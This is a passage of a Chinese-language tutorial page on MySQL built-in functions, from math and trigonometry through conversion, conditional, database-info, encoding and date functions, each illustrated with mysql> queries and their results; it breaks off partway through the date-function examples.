+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 2 的 3 次方</span><br><span class="line">mysql&gt; select pow(2, 3);</span><br><span class="line">+-----------+</span><br><span class="line">| pow(2, 3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line"># 9 的根</span><br><span class="line">mysql&gt; select sqrt(9);</span><br><span class="line">+---------+</span><br><span class="line">| sqrt(9) |</span><br><span class="line">+---------+</span><br><span class="line">|       3 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
+<h3 id="2-4-指数和对数">2.4 指数和对数</h3>
+<blockquote>
+<ul>
+<li><code>exp(num)</code>，enumenum</li>
+<li><code>ln(num)</code>，求自然对数， ln(num)ln(num)，num 要大于0，否则返回 NULL</li>
+<li><code>log(m, n)</code>，logm(n)logm(n)，n 要大于0 且 m 大于1，否则返回 NULL</li>
+<li><code>log2(n)</code>，求 2 为底 n 的对数，log2(n)log2(n)，n 要大于0，否则返回 NULL</li>
+<li><code>log10(n)</code>，求 10 为底 n 的对数，log10(n)log10(n)，n 要大于0，否则返回 NULL</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(1); #自然对数 e</span><br><span class="line">+-------------------+</span><br><span class="line">| exp(1)            |</span><br><span class="line">+-------------------+</span><br><span class="line">| 2.718281828459045 |</span><br><span class="line">+-------------------+</span><br><span class="line">mysql&gt; select ln(exp(2));</span><br><span class="line">+------------+</span><br><span class="line">| ln(exp(2)) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br><span class="line">mysql&gt; select log(3, 9); #3 为底 9 的对数</span><br><span class="line">+-----------+</span><br><span class="line">| log(3, 9) |</span><br><span class="line">+-----------+</span><br><span class="line">|         2 |</span><br><span class="line">+-----------+</span><br><span class="line">mysql&gt; select log2(0); #n 不大于 0，返回 NULL</span><br><span class="line">+---------+</span><br><span class="line">| log2(0) |</span><br><span class="line">+---------+</span><br><span class="line">|    NULL |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>
+<h3 id="2-5-三角函数">2.5 三角函数</h3>
+<blockquote>
+<ul>
+<li><code>sin(num)</code>，求正弦</li>
+<li><code>cos(num)</code>，求余弦</li>
+<li><code>tan(num)</code>，求正切</li>
+<li><code>cot(num)</code>，求余切</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sin(pi()&#x2F;2);</span><br><span class="line">+-------------+</span><br><span class="line">| sin(pi()&#x2F;2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">mysql&gt; select sin(pi()); # sin(pi) 不为0，因为这里 pi 是个约数，实际的 pi 是无效不循环数</span><br><span class="line">+------------------------+</span><br><span class="line">| sin(pi())              |</span><br><span class="line">+------------------------+</span><br><span class="line">| 1.2246467991473532e-16 |</span><br><span class="line">+------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select sin(pi()&#x2F;2);</span><br><span class="line">+-------------+</span><br><span class="line">| sin(pi()&#x2F;2) |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+<h3 id="2-6-反三角函数">2.6 反三角函数</h3>
+<blockquote>
+<ul>
+<li><code>asin(num)</code>，求反正弦，返回一个弧度值</li>
+<li><code>acos(num)</code>，求反余弦，返回一个弧度值</li>
+<li><code>atan(num)</code>，求反正切，返回一个弧度值</li>
+<li><code>acot(num)</code>，求反余切，返回一个弧度值</li>
+<li><code>atan2(n1, n2)</code>，求两个数的反正切，返回弧度值</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select asin(1); #约等于 pi&#x2F;2</span><br><span class="line">+--------------------+</span><br><span class="line">| asin(1)            |</span><br><span class="line">+--------------------+</span><br><span class="line">| 1.5707963267948966 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select pi()&#x2F;2;</span><br><span class="line">+--------------+</span><br><span class="line">| pi()&#x2F;2       |</span><br><span class="line">+--------------+</span><br><span class="line">| 1.5707963268 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>
+<h3 id="2-7-其它函数">2.7 其它函数</h3>
+<blockquote>
+<ul>
+<li><code>pi()</code>，求 ππ 值</li>
+<li><code>degrees(num)</code>，求弧度 num 的角度值</li>
+<li><code>radians(num)</code>，求角度 num 的弧度值</li>
+<li><code>rand([seed])</code>，取 [0, 1) 的随机数，可设置种子 seed，生成相同的随机数</li>
+<li><code>sign(num)</code>，返回数 num 的符号，正数为1，负数为-1，0 为 0</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select degrees(2*pi()); # 2*pi 弧度为 360 角度</span><br><span class="line">+-----------------+</span><br><span class="line">| degrees(2*pi()) |</span><br><span class="line">+-----------------+</span><br><span class="line">|             360 |</span><br><span class="line">+-----------------+</span><br><span class="line">mysql&gt; select radians(180); # 180度为 pi 弧度</span><br><span class="line">+-------------------+</span><br><span class="line">| radians(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br><span class="line">mysql&gt; select rand(); #[0,1)的随机数</span><br><span class="line">+--------------------+</span><br><span class="line">| rand()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.9826734987857505 |</span><br><span class="line">+--------------------+</span><br><span class="line">mysql&gt; select rand(), rand(1), rand(1); #相同的种子生成相同随机数</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br><span class="line">| rand()             | rand(1)             | rand(1)             |</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br><span class="line">| 0.8894535832940168 | 0.40540353712197724 | 0.40540353712197724 |</span><br><span class="line">+--------------------+---------------------+---------------------+</span><br></pre></td></tr></table></figure>
+<h2 id="3-高级函数">3 高级函数</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">BIN(x)</td>
+<td style="text-align:left">返回x的二进制值</td>
+</tr>
+<tr>
+<td style="text-align:left">BINARY(x)</td>
+<td style="text-align:left">将字符串 s 转换为二进制字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">CAST(x AS type)</td>
+<td style="text-align:left">转换数据类型</td>
+</tr>
+<tr>
+<td style="text-align:left">CASE  END</td>
+<td style="text-align:left">case表示函数开始，end结束。condition1成立，返回result1；condition2成立，返回result2……都不成立，返回result。如果一个条件成立了，后面就不执行。</td>
+</tr>
+<tr>
+<td style="text-align:left">COALESCE(expr1, expr2, …., expr_n)</td>
+<td style="text-align:left">返回参数中的第一个非空表达式（从左向右）</td>
+</tr>
+<tr>
+<td style="text-align:left">CONNECTION_ID()</td>
+<td style="text-align:left">返回服务器的连接次数</td>
+</tr>
+<tr>
+<td style="text-align:left">CONV(x,f1,f2)</td>
+<td style="text-align:left">返回f1进制数变成f2进制数</td>
+</tr>
+<tr>
+<td style="text-align:left">CONVERT(s USING cs)</td>
+<td style="text-align:left">函数将字符串s的字符集变成cs</td>
+</tr>
+<tr>
+<td style="text-align:left">DATABSE()</td>
+<td style="text-align:left">返回当前数据库名</td>
+</tr>
+<tr>
+<td style="text-align:left">IF(expr,v1,v2)</td>
+<td style="text-align:left">如果表达式expr成立，返回v1；否则返回v2</td>
+</tr>
+<tr>
+<td style="text-align:left">IFNULL(v1,v2)</td>
+<td style="text-align:left">如果v1的值不为null，则返回v1；否则返回v2</td>
+</tr>
+<tr>
+<td style="text-align:left">ISNULL(expression)</td>
+<td style="text-align:left">判断表达式是否为 NULL</td>
+</tr>
+<tr>
+<td style="text-align:left">LAST_INSERT_ID()</td>
+<td style="text-align:left">返回最近生成的 AUTO_INCREMENT 值</td>
+</tr>
+<tr>
+<td style="text-align:left">NULLIF(expr1, expr2)</td>
+<td style="text-align:left">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</td>
+</tr>
+<tr>
+<td style="text-align:left">SESSION_USER() SYSTEM_USER() USER()</td>
+<td style="text-align:left">返回当前用户</td>
+</tr>
+<tr>
+<td style="text-align:left">VERSION()</td>
+<td style="text-align:left">返回数据库当前版本号</td>
+</tr>
+</tbody>
+</table>
+<h3 id="3-1-进制转换">3.1 进制转换</h3>
+<blockquote>
+<ul>
+<li><code>bin(num)</code>，将一个数字转换为二进制表示的数字，类型为字符串</li>
+<li><code>hex(value)</code></li>
+<li><code>conv(num, from_base, to_base)</code>，将一个数字从一个进制转换到另一个进制进行表示</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 二进制表示</span><br><span class="line">mysql&gt; select bin(9), bin(4), bin(2);</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">| bin(9) | bin(4) | bin(2) |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">| 1001   | 100    | 10     |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line"># 10进制转16进制和2进制表示</span><br><span class="line">mysql&gt; select conv(16, 10, 16), conv(16, 10, 2);</span><br><span class="line">+------------------+-----------------+</span><br><span class="line">| conv(16, 10, 16) | conv(16, 10, 2) |</span><br><span class="line">+------------------+-----------------+</span><br><span class="line">| 10               | 10000           |</span><br><span class="line">+------------------+-----------------+</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-类型转换">3.2 类型转换</h3>
+<blockquote>
+<ul>
+<li><code>binary value</code>，将值转换成二进制字符串，注意和 <code>bin()</code> 转换成二进制形式的数字表示不同。</li>
+<li><code>cast(v as t)</code>，将值 v 转换成类型 t 表示</li>
+<li><code>convert(v, t)</code> | <code>convert(v using charset)</code>，将值 v 转换成类型 t 表示，或 使用字符集 charset 表示</li>
+</ul>
+</blockquote>
+<p><strong>可转换的数据类型：</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DATE</td>
+<td>格式: “YYYY-MM-DD”</td>
+</tr>
+<tr>
+<td>DATETIME</td>
+<td>格式: “YYYY-MM-DD HH:MM:SS”</td>
+</tr>
+<tr>
+<td>TIME</td>
+<td>格式: “HH:MM:SS”</td>
+</tr>
+<tr>
+<td>CHAR</td>
+<td>字符类型（固定长度的字符串）</td>
+</tr>
+<tr>
+<td>SIGNED</td>
+<td>64 位带符号整数</td>
+</tr>
+<tr>
+<td>UNSIGNED</td>
+<td>64位不带符号整数</td>
+</tr>
+<tr>
+<td>BINARY</td>
+<td>二进制字符串</td>
+</tr>
+</tbody>
+</table>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#正常字符串，比较不分大小写，所以比较结果相同</span><br><span class="line">mysql&gt; select &quot;a&quot; &#x3D; &quot;A&quot;; </span><br><span class="line">+-----------+</span><br><span class="line">| &quot;a&quot; &#x3D; &quot;A&quot; |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line">#但二进制字符串中 &quot;a&quot; 和 &quot;A&quot; 是不同的</span><br><span class="line">mysql&gt; select binary &quot;a&quot; &#x3D; binary &quot;A&quot;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| binary &quot;a&quot; &#x3D; binary &quot;A&quot; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">#转换成类型 DATETIME</span><br><span class="line">mysql&gt; select cast(&quot;2019-08-23 15:59:59&quot; as datetime);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| cast(&quot;2019-08-23 15:59:59&quot; as datetime) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| 2019-08-23 15:59:59                     |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">#使用 gbk 字符集，表示中文</span><br><span class="line">mysql&gt; select convert(&quot;中国&quot; using gbk);</span><br><span class="line">mysql&gt; select convert(&quot;中国&quot; using utf8);</span><br><span class="line">+------------------------------+</span><br><span class="line">| convert(&quot;中国&quot; using utf8)   |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 中国                         |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-条件判断函数">3.3 条件判断函数</h3>
+<blockquote>
+<ul>
+<li><code>case</code>，返回第一个满足条件的值，语法<br>
+<code>CASE</code><br>
+<code>WHEN *condition1* THEN *result1*</code><br>
+<code>WHEN *condition2* THEN *result2*</code><br>
+<code>WHEN *conditionN* THEN *resultN*</code><br>
+<code>ELSE *result*</code><br>
+<code>END;</code></li>
+<li><code>if(con, t, f)</code>，满足条件，执行 t 语句，反之，f 语句</li>
+<li><code>ifnull(expr, v)</code>，如果 expr 表达式值为 NULL，返回 v</li>
+<li><code>isnull(expr)</code>，判断 表达式 expr 值是否为 NULL，是返回 1，反之为 0</li>
+<li><code>nullif(expr1, expr2)</code>，如何两个表达式值相同，返回 NULL，反之返回 expr1</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># case 语句</span><br><span class="line">mysql&gt; select id, name, case when id&gt;&#x3D;1 and id&lt;3 then &quot;p1&quot; when id&gt;2 and id&lt;5 then &quot;p2&quot; else &quot;p3&quot; end as info  from test;</span><br><span class="line">+----+------+------+</span><br><span class="line">| id | name | info |</span><br><span class="line">+----+------+------+</span><br><span class="line">|  1 | May  | p1   |</span><br><span class="line">|  2 | June | p1   |</span><br><span class="line">|  3 | Hack | p2   |</span><br><span class="line">| 10 | Cook | p3   |</span><br><span class="line">+----+------+------+</span><br><span class="line"># if(con, t, f)</span><br><span class="line">mysql&gt; select *, if(id&gt;2, &quot;p1&quot;, &quot;p2&quot;) as part from test;</span><br><span class="line">+----+------+------+</span><br><span class="line">| id | name | part |</span><br><span class="line">+----+------+------+</span><br><span class="line">|  1 | May  | p2   |</span><br><span class="line">|  2 | June | p2   |</span><br><span class="line">|  3 | Hack | p1   |</span><br><span class="line">| 10 | Cook | p1   |</span><br><span class="line">+----+------+------+</span><br><span class="line"># ifnull(expr, v)</span><br><span class="line">mysql&gt; select ifnull(NULL, &quot;expr is null&quot;) as value;</span><br><span class="line">+--------------+</span><br><span class="line">| value        |</span><br><span class="line">+--------------+</span><br><span class="line">| expr is null |</span><br><span class="line">+--------------+</span><br><span class="line"># nullif(expr1, expr2)</span><br><span class="line">mysql&gt; select nullif(&quot;100&quot;, 100); #数字和字符一样</span><br><span class="line">+--------------------+</span><br><span class="line">| nullif(&quot;100&quot;, 100) |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line"># 不分大小写</span><br><span class="line">mysql&gt; select nullif(&quot;Case&quot;,&quot;cAse&quot; );</span><br><span class="line">+------------------------+</span><br><span class="line">| nullif(&quot;Case&quot;,&quot;cAse&quot; ) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL                   |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="3-4-数据库信息">3.4 数据库信息</h3>
+<blockquote>
+<ul>
+<li><code>current_user()</code>，MySQL 授权的用户名和主机名</li>
+<li><code>user()</code> | <code>session_user()</code> | <code>system_user()</code>，当前连接的用户名和主机名</li>
+<li><code>database()</code>，当前数据库</li>
+<li><code>connection_id()</code>，当前 连接的 ID</li>
+<li><code>version()</code>，MySQL 版本号</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># current_user() 和 user()|session_user()| system_user() 的区别，只有一个用户名具有多个主机才有区别，如 username@%</span><br><span class="line"># 在服务器主机登陆，这四个都是一样的主机名 localhost</span><br><span class="line">mysql&gt; select  current_user(), user(), session_user(), system_user();</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line">| current_user()    | user()            | session_user()    | system_user()     |</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line">| user102@localhost | user102@localhost | user102@localhost | user102@localhost |</span><br><span class="line">+-------------------+-------------------+-------------------+-------------------+</span><br><span class="line"># 在客户端用进行远程登陆，主机名会改变</span><br><span class="line">mysql&gt; select  current_user(), user();</span><br><span class="line">+-------------------+----------------------+</span><br><span class="line">| current_user()    | user()               |</span><br><span class="line">+-------------------+----------------------+</span><br><span class="line">| user102@%         | user102@192.168.47.1 |</span><br><span class="line">+-------------------+----------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="3-5-加解密">3.5 加解密</h3>
+<blockquote>
+<ul>
+<li><code>hex(value)</code> | <code>unhex(value)</code>，转换成 16 进制的字符串表示，或从 16 进制字符串转回正常的字符串表示</li>
+<li><code>to_base64(s)</code> | <code>from_base64(s)</code> ，转换成 base64 编码的字符串或者从 base64 编码的字符串转回正常的字符串表示</li>
+<li><code>encode(s, p)</code> | <code>decode(s, p)</code>，将字符串 s 使用密码 p 进行 加解密</li>
+<li><code>compress(s)</code> | <code>uncompress(s)</code> 压缩或解压 s</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select unhex(&#39;hhhh, who are you!&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| unhex(&#39;hhhh, who are you!&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| NULL                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">mysql&gt; select unhex(hex(&#39;hhhh, who are you!&#39;));</span><br><span class="line">+----------------------------------+</span><br><span class="line">| unhex(hex(&#39;hhhh, who are you!&#39;)) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| hhhh, who are you!               |</span><br><span class="line">+----------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select to_base64(&#39;hhhh, who are you!&#39;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| to_base64(&#39;hhhh, who are you!&#39;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| aGhoaCwgd2hvIGFyZSB5b3Uh        |</span><br><span class="line">+---------------------------------+</span><br><span class="line">mysql&gt; select from_base64(to_base64(&#39;hhhh, who are you!&#39;));</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| from_base64(to_base64(&#39;hhhh, who are you!&#39;)) |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| hhhh, who are you!                           |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line"># 加解密</span><br><span class="line">mysql&gt; select decode(encode(&#39;string&#39;, &#39;hhh&#39;), &#39;hhh&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| decode(encode(&#39;string&#39;, &#39;hhh&#39;), &#39;hhh&#39;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| string                                 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line"># 压缩和解压</span><br><span class="line">mysql&gt; select uncompress(compress(&quot;What the hell!&quot;));</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| uncompress(compress(&quot;What the hell!&quot;)) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What the hell!                         |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="3-6-其它函数">3.6 其它函数</h3>
+<blockquote>
+<ul>
+<li><code>coalesce(v1, v2, ...)</code>，返回列表中第一个非 NULL 值</li>
+<li><code>last_insert_id([expr])</code>，返回当表中 最新行的 AUTO_INCREMENT 属性的 id 值</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select coalesce(null, &quot;not null&quot;, 3);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| coalesce(null, &quot;not null&quot;, 3) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| not null                      |</span><br><span class="line">+-------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select last_insert_id();</span><br><span class="line">+------------------+</span><br><span class="line">| last_insert_id() |</span><br><span class="line">+------------------+</span><br><span class="line">|               10 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
+<h2 id="4-日期函数">4 日期函数</h2>
+<p>MySQL 中关于日期的函数特别多，好像在 SQL 注入过程中不常用到，还是稍微总结下。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">CURDATE() CURRENT_DATE()</td>
+<td style="text-align:left">返回当前日期</td>
+</tr>
+<tr>
+<td style="text-align:left">CURTIME() CURRENT_TIME()</td>
+<td style="text-align:left">返回当前时间</td>
+</tr>
+<tr>
+<td style="text-align:left">CURRENT_TIMESTAMP()</td>
+<td style="text-align:left">返回当前时间和日期</td>
+</tr>
+<tr>
+<td style="text-align:left">EXTRACT(type FROM d)</td>
+<td style="text-align:left">从日期 d 中获取指定的值，type 指定返回的值。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="4-1-当前日期和时间">4.1 当前日期和时间</h3>
+<p>MySQL 中日期表示的格式为 “YYYY-MM-DD”，时间表示的格式为 “HH-MM-SS”，日期和时间一起表示为 “YYYY-MM-DD HH-MM-SS”。</p>
+<blockquote>
+<ul>
+<li><code>curdate()</code> | <code>current_date()</code>，返回 “YYYY-MM-DD”格式的字符串 或者YYYYMMDD 格式的数字</li>
+<li><code>curtime()</code> | <code>current_time()</code>，返回 “HH-MM-SS” 格式的字符串 或者 HHMMSS.uuuuuu 格式的数字</li>
+<li><code>current_timestamp()</code> | <code>now()</code> | <code>systdate()</code>，返回当前日期和时间，格式不变</li>
+<li><code>localtime()</code> | <code>local_timestamp()</code>，返回当前日期和时间，格式不变</li>
+</ul>
+</blockquote>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select current_date(), curdate();</span><br><span class="line">+----------------+------------+</span><br><span class="line">| current_date() | curdate()  |</span><br><span class="line">+----------------+------------+</span><br><span class="line">| 2019-08-24     | 2019-08-24 |</span><br><span class="line">+----------------+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select current_time(), curtime();</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| current_time() | curtime() |</span><br><span class="line">+----------------+-----------+</span><br><span class="line">| 07:38:16       | 07:38:16  |</span><br><span class="line">+----------------+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select current_timestamp(), now(), sysdate();</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line">| current_timestamp() | now()               | sysdate()           |</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line">| 2019-08-24 07:40:04 | 2019-08-24 07:40:04 | 2019-08-24 07:40:04 |</span><br><span class="line">+---------------------+---------------------+---------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select localtime(), localtimestamp();</span><br><span class="line">+---------------------+---------------------+</span><br><span class="line">| localtime()         | localtimestamp()    |</span><br><span class="line">+---------------------+---------------------+</span><br><span 